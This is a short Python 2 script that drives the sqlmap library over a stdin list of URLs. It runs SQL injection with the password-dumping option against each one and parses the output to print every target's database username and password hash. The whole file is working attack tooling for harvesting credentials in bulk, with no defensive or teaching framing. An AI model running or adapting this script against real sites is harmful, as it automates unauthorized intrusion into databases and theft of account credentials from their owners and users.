#!/usr/bin/env python
import re
from StringIO import StringIO
import sys
import os

SQLMAP_ROOT = os.path.join(os.getcwd(),'sqlmaparch')
sys.path.append(SQLMAP_ROOT)

from lib.controller.controller import start as sqlmap_start
from lib.core.common import setPaths as sqlmap_setPaths
from lib.core.data import cmdLineOptions as sqlmap_cmdLineOptions
from lib.core.data import paths as sqlmap_paths
from lib.core.option import init as sqlmap_init
from lib.core.option import initOptions as sqlmap_initOptions
from lib.parse.cmdline import cmdLineParser

import sqlmap

def main():

    username_re = re.compile(r'\[\*\] (\S+) \[1\]')
    hash_re = re.compile(r'\s*password hash: (\*[A-F0-9]+)')

    # Configure sqlmap
    sqlmap_paths.SQLMAP_ROOT_PATH = SQLMAP_ROOT
    sqlmap_setPaths()
    sqlmapOptions = getSqlmapOptions()

    # Run sqlmap on every URL received on stdin
    for inline in sys.stdin:

        url = inline.strip()
        sqlmapOptions['url'] = url
        
        sqlmap_cmdLineOptions.update(sqlmapOptions)
        sqlmap_initOptions(sqlmap_cmdLineOptions)

        sys.stdout = capturedOutput = StringIO()
        sqlmap_init()
        sqlmap_start()

        sys.stdout = sys.__stdout__
        username = 'unknown'

        for outline in capturedOutput.getvalue().split('\n'):
            result = username_re.match(outline)
            if result:
                username = result.group(1)

            result = hash_re.match(outline)
            if result:
                hash_ = result.group(1)
                sys.stdout.write("%s %s %s\n" % (url, username, hash_))
                sys.stdout.flush()
   
def getSqlmapOptions():
    """ Returns our command line options in sqlmap's internal dict format. """

    temp_sys_argv = sys.argv
    sys.argv = ['sqlmap.py', '--batch', '--flush-session', '--passwords', '-v', '0', '-u', 'foo']
    options = cmdLineParser().__dict__
    sys.argv = temp_sys_argv

    return options

if __name__ == '__main__':
    main()

